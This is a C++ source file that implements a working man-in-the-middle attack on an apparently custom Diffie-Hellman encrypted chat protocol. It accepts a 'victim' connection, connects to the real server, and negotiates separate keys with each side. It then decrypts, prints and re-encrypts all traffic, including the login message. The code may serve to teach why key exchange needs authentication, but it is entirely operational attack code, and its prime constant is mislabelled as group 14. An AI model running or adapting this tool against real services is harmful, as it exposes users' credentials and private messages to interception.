
#include <openssl/bn.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/sha.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>
#include <cstring>
#include <iostream>
#include <string>
#include <vector>
#include <mutex>
#include <thread>
#include <atomic>
#include <sstream>
#include <iomanip>
#include <algorithm>

static const char *GROUP14_P =
"FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1"
"29024E088A67CC74020BBEA63B139B22514A08798E3404DD"
"EF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245"
"E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7ED"
"EE386BFB5A899FA5AE9F24117C4B1FE649286651ECE65381"
"FFFFFFFFFFFFFFFF";

static std::string hex_of(const unsigned char *p, size_t n) {
    std::ostringstream o;
    for (size_t i=0;i<n;i++) o << std::hex << std::setw(2) << std::setfill('0') << (int)p[i];
    return o.str();
}
static std::vector<unsigned char> unhex(const std::string &s) {
    std::vector<unsigned char> out;
    if (s.size()%2) return {};
    for(size_t i=0;i<s.size();i+=2) out.push_back((unsigned char)std::stoul(s.substr(i,2),nullptr,16));
    return out;
}
static std::string b64(const unsigned char *p, int n) {
    std::string out(4*((n+2)/3), '\0');
    int m=EVP_EncodeBlock((unsigned char*)out.data(),p,n);
    out.resize(m); return out;
}
static std::vector<unsigned char> unb64(const std::string &s) {
    std::vector<unsigned char> out((s.size()*3)/4+4);
    int n=EVP_DecodeBlock(out.data(),(const unsigned char*)s.data(),(int)s.size());
    if(n<0) return {};
    int pad=0; if(!s.empty()&&s.back()=='=') pad++; if(s.size()>1&&s[s.size()-2]=='=') pad++;
    out.resize(n-pad); return out;
}
static std::string recv_line(int fd, size_t maxlen=1024*1024) {
    std::string s; char c;
    while(s.size()<maxlen) {
        ssize_t n=recv(fd,&c,1,0);
        if(n<=0) return {};
        if(c=='\n') return s;
        s.push_back(c);
    }
    return {};
}
static bool send_all(int fd,const std::string &s) {
    size_t off=0; while(off<s.size()) {
        ssize_t n=send(fd,s.data()+off,s.size()-off,MSG_NOSIGNAL);
        if(n<=0) return false; off+=n;
    }
    return true;
}
static BIGNUM *bn_from_hex(const char *s) { BIGNUM *x=nullptr; BN_hex2bn(&x,s); return x; }

static bool dh_make(BIGNUM *p, BIGNUM *g, BIGNUM **priv, BIGNUM **pub) {
    *priv=BN_new(); *pub=BN_new(); BN_CTX *ctx=BN_CTX_new();
    if(!*priv||!*pub||!ctx) return false;
    if(!BN_priv_rand(*priv,BN_num_bits(p)-1,BN_RAND_TOP_TWO,BN_RAND_BOTTOM_ANY)) return false;
    if(!BN_mod_exp(*pub,g,*priv,p,ctx)) return false;
    BN_CTX_free(ctx); return true;
}
static BIGNUM *dh_shared(const BIGNUM *peer,const BIGNUM *priv,const BIGNUM *p) {
    BIGNUM *s=BN_new(); BN_CTX *ctx=BN_CTX_new();
    if(!s||!ctx) { BN_free(s); BN_CTX_free(ctx); return nullptr; }
    if(!BN_mod_exp(s,peer,priv,p,ctx)) { BN_free(s); s=nullptr; }
    BN_CTX_free(ctx); return s;
}
static std::vector<unsigned char> derive_key(const BIGNUM *secret) {
    int n=BN_num_bytes(secret); std::vector<unsigned char> raw(n);
    BN_bn2bin(secret,raw.data());
    unsigned char h[SHA256_DIGEST_LENGTH]; SHA256(raw.data(),raw.size(),h);
    return std::vector<unsigned char>(h,h+32);
}
static std::string fingerprint(const std::vector<unsigned char>& key) {
    unsigned char h[SHA256_DIGEST_LENGTH]; SHA256(key.data(),key.size(),h);
    return hex_of(h,32);
}
static std::string gcm_encrypt(const std::vector<unsigned char>& key,const std::string& plain) {
    unsigned char nonce[12]; if(RAND_bytes(nonce,12)!=1) return {};
    EVP_CIPHER_CTX *c=EVP_CIPHER_CTX_new(); if(!c) return {};
    std::vector<unsigned char> ct(plain.size()+16); int l1=0,l2=0;
    bool ok=EVP_EncryptInit_ex(c,EVP_aes_256_gcm(),nullptr,nullptr,nullptr)==1;
    ok=ok&&EVP_CIPHER_CTX_ctrl(c,EVP_CTRL_GCM_SET_IVLEN,12,nullptr)==1;
    ok=ok&&EVP_EncryptInit_ex(c,nullptr,nullptr,key.data(),nonce)==1;
    ok=ok&&EVP_EncryptUpdate(c,ct.data(),&l1,(const unsigned char*)plain.data(),(int)plain.size())==1;
    ok=ok&&EVP_EncryptFinal_ex(c,ct.data()+l1,&l2)==1;
    unsigned char tag[16]; ok=ok&&EVP_CIPHER_CTX_ctrl(c,EVP_CTRL_GCM_GET_TAG,16,tag)==1;
    EVP_CIPHER_CTX_free(c); if(!ok) return {};
    std::vector<unsigned char> wire(nonce,nonce+12);
    wire.insert(wire.end(),ct.begin(),ct.begin()+l1+l2); wire.insert(wire.end(),tag,tag+16);
    return "ENC|"+b64(wire.data(),(int)wire.size());
}
static bool gcm_decrypt(const std::vector<unsigned char>& key,const std::string& msg,std::string& plain) {
    if(msg.rfind("ENC|",0)!=0) return false;
    auto w=unb64(msg.substr(4)); if(w.size()<28) return false;
    const unsigned char *nonce=w.data(), *tag=w.data()+w.size()-16, *ct=w.data()+12;
    int ctlen=(int)w.size()-28, l1=0,l2=0; std::vector<unsigned char> pt(ctlen+1);
    EVP_CIPHER_CTX *c=EVP_CIPHER_CTX_new(); if(!c) return false;
    bool ok=EVP_DecryptInit_ex(c,EVP_aes_256_gcm(),nullptr,nullptr,nullptr)==1;
    ok=ok&&EVP_CIPHER_CTX_ctrl(c,EVP_CTRL_GCM_SET_IVLEN,12,nullptr)==1;
    ok=ok&&EVP_DecryptInit_ex(c,nullptr,nullptr,key.data(),nonce)==1;
    ok=ok&&EVP_DecryptUpdate(c,pt.data(),&l1,ct,ctlen)==1;
    ok=ok&&EVP_CIPHER_CTX_ctrl(c,EVP_CTRL_GCM_SET_TAG,16,(void*)tag)==1;
    ok=ok&&EVP_DecryptFinal_ex(c,pt.data()+l1,&l2)==1;
    EVP_CIPHER_CTX_free(c); if(!ok) return false;
    plain.assign((char*)pt.data(),l1+l2); return true;
}
static void free_bn(BIGNUM *&x){ BN_free(x); x=nullptr; }

static int conn(const std::string&ip,int port){
 int f=socket(AF_INET,SOCK_STREAM,0);sockaddr_in a{};a.sin_family=AF_INET;a.sin_port=htons(port);inet_pton(AF_INET,ip.c_str(),&a.sin_addr);
 if(connect(f,(sockaddr*)&a,sizeof(a))<0){close(f);return -1;}return f;
}
static bool relay_one(int in,int out,const std::vector<unsigned char>&kin,const std::vector<unsigned char>&kout,const std::string&label){
 std::string w=recv_line(in);if(w.empty())return false;std::string p;if(!gcm_decrypt(kin,w,p)){std::cerr<<"[MITM] "<<label<<" authentication failure\n";return false;}
 std::cout<<"[MITM "<<label<<" PLAINTEXT] "<<p<<"\n";auto e=gcm_encrypt(kout,p);return !e.empty()&&send_all(out,e+"\n");
}
int main(int argc,char**argv){
 if(argc<2||argc>3){std::cerr<<"Usage: "<<argv[0]<<" <server-ip> [listen-port]\n";return 1;}
 std::string serverip=argv[1];int lport=argc==3?std::stoi(argv[2]):6000;
 int ls=socket(AF_INET,SOCK_STREAM,0);int one=1;setsockopt(ls,SOL_SOCKET,SO_REUSEADDR,&one,sizeof(one));
 sockaddr_in a{};a.sin_family=AF_INET;a.sin_addr.s_addr=INADDR_ANY;a.sin_port=htons(lport);if(bind(ls,(sockaddr*)&a,sizeof(a))<0){perror("bind");return 1;}listen(ls,1);
 std::cout<<"[MITM] listening on port "<<lport<<"\n";
 int victim=accept(ls,nullptr,nullptr);if(victim<0)return 1;int real=conn(serverip,5000);if(real<0){perror("server connect");return 1;}
 BIGNUM *p=bn_from_hex(GROUP14_P),*g=BN_new(),*vpriv=nullptr,*vpub=nullptr,*spriv=nullptr,*spub=nullptr,*vpeer=nullptr,*speer=nullptr,*vs=nullptr,*ss=nullptr;BN_set_word(g,2);
 dh_make(p,g,&vpriv,&vpub);dh_make(p,g,&spriv,&spub);
 recv_line(real);recv_line(real); // server DH_P, DH_G
 std::string wp="DH_P|"+std::string(GROUP14_P)+"\n",wg="DH_G|2\n";
 send_all(victim,wp);send_all(victim,wg);send_all(victim,"DH_PUB|"+std::string(BN_bn2hex(vpub))+"\n");
 send_all(real,"DH_PUB|"+std::string(BN_bn2hex(spub))+"\n");
 std::string x=recv_line(victim);if(x.rfind("DH_PUB|",0)!=0)return 1;vpeer=bn_from_hex(x.substr(7).c_str());
 std::string y=recv_line(real);if(y.rfind("DH_PUB|",0)!=0)return 1;speer=bn_from_hex(y.substr(7).c_str());
 vs=dh_shared(vpeer,vpriv,p);ss=dh_shared(speer,spriv,p);auto vk=derive_key(vs),sk=derive_key(ss);
 std::cout<<"[MITM] victim-side fingerprint: "<<fingerprint(vk)<<"\n";
 std::cout<<"[MITM] server-side fingerprint: "<<fingerprint(sk)<<"\n";
 send_all(victim,"DH_PUB|"+std::string(BN_bn2hex(spub))+"\n");send_all(real,"DH_PUB|"+std::string(BN_bn2hex(vpub))+"\n");
 recv_line(victim);recv_line(real);send_all(victim,"DH_OK\n");send_all(real,"DH_OK\n");
 std::string lw=recv_line(victim);std::string lp;if(!gcm_decrypt(vk,lw,lp)){std::cerr<<"MITM login decrypt failed\n";return 1;}
 std::cout<<"[MITM C->S PLAINTEXT] "<<lp<<"\n";send_all(real,gcm_encrypt(sk,lp)+"\n");
 std::thread athread([&](){while(true){if(!relay_one(victim,real,vk,sk,"C->S"))break;}});
 std::thread bthread([&](){while(true){if(!relay_one(real,victim,sk,vk,"S->C"))break;}});
 athread.join();bthread.detach();
 close(victim);close(real);close(ls);free_bn(p);free_bn(g);free_bn(vpriv);free_bn(vpub);free_bn(spriv);free_bn(spub);free_bn(vpeer);free_bn(speer);free_bn(vs);free_bn(ss);return 0;
}
